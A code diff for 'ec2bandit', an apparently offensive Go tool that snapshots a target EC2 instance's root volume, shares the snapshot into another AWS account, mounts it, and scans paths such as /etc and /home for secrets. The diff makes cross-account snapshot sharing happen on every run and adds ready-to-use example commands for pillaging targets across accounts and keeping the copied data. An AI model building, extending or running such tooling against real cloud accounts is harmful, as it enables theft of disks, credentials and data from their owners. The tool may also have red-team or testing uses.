@@ -1,4 +1,4 @@
-package main
+package ec2bandit
 
 import (
 	"context"
@@ -16,10 +16,8 @@ import (
 	"ec2bandit/pkg/utils"
 )
 
-func main() {
-	// Print banner by default
-	banner.Print(false)
-
+// Execute runs the main ec2bandit functionality
+func Execute() error {
 	cfg := &config.Config{}
 
 	// Command line flags
@@ -35,11 +33,20 @@ func main() {
 	flag.StringVar(&cfg.PillagePath, "pillage-path", "", "Path to pillage")
 	flag.StringVar(&cfg.OutFile, "out-file", "", "Output file path")
 	flag.BoolVar(&cfg.JSON, "json", false, "Output in JSON format")
-	flag.BoolVar(&cfg.Transfer, "transfer", false, "Enable transfer mode")
 	flag.BoolVar(&cfg.Debug, "debug", false, "Enable debug logging")
 	flag.BoolVar(&cfg.NoBanner, "no-banner", false, "Disable banner display")
+	flag.BoolVar(&cfg.ShowExamples, "examples", false, "Show example commands")
 
 	flag.Parse()
+
+	// If examples flag is set, show examples and exit
+	if cfg.ShowExamples {
+		showExamples()
+		return nil
+	}
+
+	// Print banner unless disabled
+	banner.Print(cfg.NoBanner)
 
 	// If -no-banner was passed, clear the screen
 	if cfg.NoBanner {
@@ -48,19 +55,21 @@ func main() {
 
 	// Initialize logging with debug flag
 	if err := utils.InitLogging(cfg.Debug); err != nil {
-		fmt.Fprintf(os.Stderr, "Failed to initialize logging: %v\n", err)
-		os.Exit(1)
+		return fmt.Errorf("failed to initialize logging: %v", err)
 	}
 
 	utils.Debug("Configuration: %+v", cfg)
 
 	// Validate configuration
 	if err := utils.ValidateConfig(cfg); err != nil {
-		utils.Error("Configuration validation failed: %v", err)
-		os.Exit(1)
+		return fmt.Errorf("configuration validation failed: %v", err)
 	}
 
-	if err := run(cfg); err != nil {
+	return run(cfg)
+}
+
+func main() {
+	if err := Execute(); err != nil {
 		utils.Error("Application failed: %v", err)
 		os.Exit(1)
 	}
@@ -121,22 +130,20 @@ func handleEncryptedSnapshot(ctx context.Context, cfg *config.Config, services *
 func handleUnencryptedSnapshot(ctx context.Context, cfg *config.Config, services *aws.Services, scanner *trufflehog.Scanner, snapshotID string) error {
 	utils.Debug("Creating volume from unencrypted snapshot...")
 	
-	// If transfer flag is set, share the snapshot with the destination account
-	if cfg.Transfer {
-		utils.Debug("Transferring snapshot between accounts...")
-		
-		// Get destination account ID
-		dstAccountID, err := services.DstClient.STS.GetCallerIdentity(ctx, &sts.GetCallerIdentityInput{})
-		if err != nil {
-			return fmt.Errorf("failed to get destination account ID: %w", err)
-		}
-
-		// Share snapshot with destination account
-		if err := services.EBSOps.ShareSnapshot(ctx, snapshotID, *dstAccountID.Account); err != nil {
-			return fmt.Errorf("failed to share snapshot: %w", err)
-		}
-		utils.Info("Shared snapshot with account: %s", *dstAccountID.Account)
+	// Always share the snapshot with the destination account
+	utils.Debug("Sharing snapshot between accounts...")
+	
+	// Get destination account ID
+	dstAccountID, err := services.DstClient.STS.GetCallerIdentity(ctx, &sts.GetCallerIdentityInput{})
+	if err != nil {
+		return fmt.Errorf("failed to get destination account ID: %w", err)
 	}
+
+	// Share snapshot with destination account
+	if err := services.EBSOps.ShareSnapshot(ctx, snapshotID, *dstAccountID.Account); err != nil {
+		return fmt.Errorf("failed to share snapshot: %w", err)
+	}
+	utils.Info("Shared snapshot with account: %s", *dstAccountID.Account)
 
 	// Get the availability zone of the mount host
 	instanceResp, err := services.DstClient.EC2.DescribeInstances(ctx, &ec2.DescribeInstancesInput{
@@ -198,4 +205,79 @@ func handleUnencryptedSnapshot(ctx context.Context, cfg *config.Config, services
 	}
 
 	return nil
+}
+
+// showExamples displays example commands for using ec2bandit
+func showExamples() {
+	examples := `Example Commands for ec2bandit:
+
+1. Basic Usage (Same Account):
+   Pillage a target EC2 instance's root volume in the same AWS account:
+   go run ec2bandit.go \
+       --src-profile myprofile \
+       --dst-profile myprofile \
+       --src-region us-east-1 \
+       --dst-region us-east-1 \
+       --mount-path /mnt/target \
+       --pillage \
+       --ssh-key-path ~/.ssh/mykey.pem \
+       --target-ec2 i-0123456789abcdef0 \
+       --mount-host i-0123456789abcdef1 \
+       --pillage-path /etc/
+
+2. Cross-Account Usage:
+   Pillage a target EC2 instance's root volume across different AWS accounts:
+   go run ec2bandit.go \
+       --src-profile source-account \
+       --dst-profile dest-account \
+       --src-region us-east-1 \
+       --dst-region us-east-1 \
+       --mount-path /mnt/target \
+       --pillage \
+       --ssh-key-path ~/.ssh/mykey.pem \
+       --target-ec2 i-0123456789abcdef0 \
+       --mount-host i-0123456789abcdef1 \
+       --pillage-path /var/www \
+       --json \
+       --out-file results.json
+
+3. Debug Mode:
+   Run with debug logging enabled:
+   go run ec2bandit.go \
+       --src-profile myprofile \
+       --dst-profile myprofile \
+       --src-region us-east-1 \
+       --dst-region us-east-1 \
+       --mount-path /mnt/target \
+       --pillage \
+       --ssh-key-path ~/.ssh/mykey.pem \
+       --target-ec2 i-0123456789abcdef0 \
+       --mount-host i-0123456789abcdef1 \
+       --pillage-path /home \
+       --debug
+
+4. Retain Resources:
+   Keep snapshots and volumes after pillaging:
+   go run ec2bandit.go \
+       --src-profile myprofile \
+       --dst-profile myprofile \
+       --src-region us-east-1 \
+       --dst-region us-east-1 \
+       --mount-path /mnt/target \
+       --pillage \
+       --ssh-key-path ~/.ssh/mykey.pem \
+       --target-ec2 i-0123456789abcdef0 \
+       --mount-host i-0123456789abcdef1 \
+       --pillage-path /opt \
+       --retain
+
+5. List EBS Volumes:
+   List available EBS volumes in the destination account:
+   go run ec2bandit.go \
+       --dst-profile myprofile \
+       --dst-region us-east-1
+
+Note: Replace profile names, regions, instance IDs, and paths with your actual values.
+`
+	fmt.Println(examples)
 } 
